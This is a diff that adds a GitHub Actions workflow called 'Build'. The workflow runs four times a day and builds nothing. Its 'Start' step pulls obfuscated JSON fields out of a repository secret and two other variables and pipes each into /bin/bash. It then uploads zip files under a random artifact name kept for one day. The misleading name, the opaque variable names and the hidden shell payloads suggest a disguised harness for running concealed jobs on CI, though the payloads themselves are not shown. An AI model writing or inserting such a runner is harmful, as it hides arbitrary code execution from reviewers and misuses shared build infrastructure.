@@ -1,0 +1,29 @@
+name: Build
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '57 1,7,13,19 * * *'
+env:
+  CI: true
+jobs:
+  process:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      - name: Start
+        env:
+          ky30: ${{ secrets.ky30 }}
+        run: |
+          printf '%s' "$ky30" | jq -r .qm5 | /bin/bash
+          echo $gg006 | jq -r .do618 | /bin/bash
+          echo $a77 | jq -r .ezpt112 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: kll8rYNS
+          path: "*.zip"
+          retention-days: 1
